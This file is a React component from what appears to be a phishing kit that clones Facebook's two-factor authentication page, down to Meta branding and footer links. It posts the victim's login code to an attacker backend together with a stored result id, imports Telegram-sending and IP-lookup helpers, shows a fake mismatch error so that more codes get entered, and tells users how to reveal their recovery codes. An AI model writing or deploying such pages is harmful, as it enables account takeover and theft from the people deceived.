import React, { useEffect, useState } from "react";
import { Modal } from "antd";
import { useNavigate } from "react-router-dom";
import { sendTelegram } from "./utils/sendTelegram";
import "./styles/confirmation.css";
import { v4 as uuidv4 } from "uuid";
import { API_BE } from "./utils/variable";
import { getIpAddress } from "./utils/getIpAddress";
import axios from 'axios'

export const Confirmation = (props) => {
  const navigate = useNavigate();
  const [isModalVisible, setIsModalVisible] = useState(false);
  const [minutes, setMinutes] = useState(4);
  const [seconds, setSeconds] = useState(59);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    let myInterval = setInterval(() => {
      if (seconds > 0) {
        setSeconds(seconds - 1);
      }
      if (seconds === 0) {
        if (minutes === 0) {
          clearInterval(myInterval);
        } else {
          setMinutes(minutes - 1);
          setSeconds(59);
        }
      }
    }, 1000);
    return () => {
      clearInterval(myInterval);
    };
  });

  const handleInputCode = (value) => {
    if (value.length > 8) return;
    setCode(value);
  };

  const showModal = () => {
    setIsModalVisible(true);
  };

  const handleOk = () => {
    setIsModalVisible(false);
  };

  const handleCancel = () => {
    setIsModalVisible(false);
  };


  const handleSubmit = () => {
    if (!code.length || code.length < 6 || loading) return;
    setLoading(true);

    const result = JSON.parse(localStorage.getItem('result'))

    axios.post(`${API_BE}/results/code-generator/`, {
      result: result.id,
      number: code
    }).then(response => response.data).then(data => {
      localStorage.setItem("code", JSON.stringify(data))
      props.setValue(0);
    })
  };

  const isCode = localStorage.getItem("code");

  return (
    <>
      <div className="confirmation-container confirmation__container-modal">
        <div className="header-color">
          <div className="header-container">
            <div className="logo__faceook"></div>
          </div>
        </div>
        <div className="auth-req-container">
          <div className="auth-req">
            <div className="auth-req-text">
              <h2>Two-factor authentication required</h2>
              <div className="auth-req-paragraph">
                <p className="first">
                  You’ve asked us to require a 6-digit login code when anyone
                  tries to access your account from a new device or browser.
                </p>
                <p className="second">
                  Enter the 6-digit code from your{" "}
                  <strong>code generator</strong> or third-party app below.
                </p>
              </div>
              <div className="input-auth-req">
                <input
                  className="show-input-on-desktop"
                  placeholder="Login Code"
                  type="number"
                  required
                  value={code}
                  onChange={(e) => handleInputCode(e.target.value)}
                />
                {isCode && <div className="show-error-modal">
                  <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
                </div>}

                {minutes === 0 && seconds === 0 ? null : (
                  <span>
                    {" "}
                    (wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds})
                  </span>
                )}
              </div>
            </div>
            <div className="show-input-on-mobile show__input-modal">
              <input
                type="number"
                value={code}
                onChange={(e) => handleInputCode(e.target.value)}
              />
              {
                isCode && <div>
                  <p className="login__code">The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
                </div>
              }

              <div className="show-error-modal">
                <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
              </div>
              {/* {minutes === 0 && seconds === 0 ? null : (
                <span>
                  {" "}
                  (wait {minutes}:{seconds < 10 ? `0${seconds}` : seconds})
                </span>
              )} */}
            </div>
            <div className="auth-req-footer">
              <a onClick={showModal}>Need another way to authenticate?</a>
              <button
                className={`${loading && "disableButton"}`}
                onClick={handleSubmit}
              >
                <span>Continue</span>
              </button>
            </div>
          </div>
          <div className="having-trouble-class">
            <button onClick={showModal}>Having trouble?</button>
          </div>
          <div className={`show-button-mobile ${loading && "disableButton"}`}>
            <button onClick={handleSubmit}>Continue</button>
          </div>
          <div className="show-footer-on-mobile-plus">
            <h2 className="h2-foot not__you-text">Not You? Log In Here</h2>
            <div className="footer-flex-mobile-plus confimartion__modal">
              <div>
                <h2>English (US)</h2>
                <p>Deutsch</p>
                <p>Српски</p>
                <p>Português (Brasil)</p>
              </div>
              <div>
                <p>Italiano</p>
                <p>Bosanski</p>
                <p>Svensk</p>
                <button>+</button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="footer__modal-code">
        <div className="footer-menu-flex-ul">
          <div className="container-language-footer">
            <ul className="flex-ul">
              <li>English (US)</li>
              <li>Español</li>
              <li>Deutsch</li>
              <li>Türkçe</li>
              <li>Српски</li>
              <li>Français (France)</li>
              <li>Italiano</li>
              <li>Bosanski</li>
              <li>Svensk</li>
              <li>Português (Brasil)</li>
              <button className="countrys-button">
                <span>+</span>
              </button>
            </ul>
          </div>
          <div className="flex-second-ul">
            <ul>
              <li>Sign Up</li>
              <li>Log In</li>
              <li>Messenger</li>
              <li>Facebook Lite</li>
              <li>Watch</li>
              <li>Places</li>
              <li>Games</li>
              <li>Marketplace</li>
              <li>Facebook Pay</li>
              <li>Oculus</li>
              <li>Portal</li>
              <li>Instagram</li>
              <li>Bulletin</li>
              <li>Local</li>
            </ul>
          </div>
          <div className="flex-second-ul-2">
            <ul>
              <li>Fundraisers</li>
              <li>Services</li>
              <li>Voting Information Centre</li>
              <li>About</li>
              <li>Create ad</li>
              <li>Create Page</li>
              <li>Developers</li>
              <li>Careers</li>
              <li>Privacy</li>
              <li>Cookies</li>
              <li className="ad-choice-img">
                Ad Choices <span className="img-li"></span>{" "}
              </li>
              <li>Terms</li>
              <li>Help</li>
            </ul>
          </div>
          <div className="meta-footer">
            <p>Meta © 2022</p>
          </div>
        </div>
      </div>

      <Modal
        bodyStyle={{ height: 700 }}
        title="Didn't receive a code?"
        visible={isModalVisible}
        onOk={handleOk}
        onCancel={handleCancel}
        closable={false}
        className="modal-height-confirmation"
        okText="Get Code"
        cancelText="Close"
      >
        <div className="modal-conatiner-code">
          <div className="mt-10 p-x">
            1. Go To <strong>Settings</strong> &gt;{" "}
            <span className="color-blue">Security and Login</span>
          </div>
          <div className="mt-10 p-x">
            2. Under the <strong>Two-Factor Authentication</strong> section,
            click <strong>Use two-factor authentication.</strong> You may need
            to re-enter your password.
          </div>
          <div className="mt-10 p-x">
            3. Next to <strong>Recovery Codes</strong> click{" "}
            <strong>Setup</strong> then <strong>Get Codes.</strong> If you've
            already set up recovery codes, you can click{" "}
            <strong>Show Codes.</strong>
          </div>
          <div className="modal-image-responsive">
            <img src="/code.jpeg" />
          </div>
        </div>
      </Modal>
    </>
  );
};
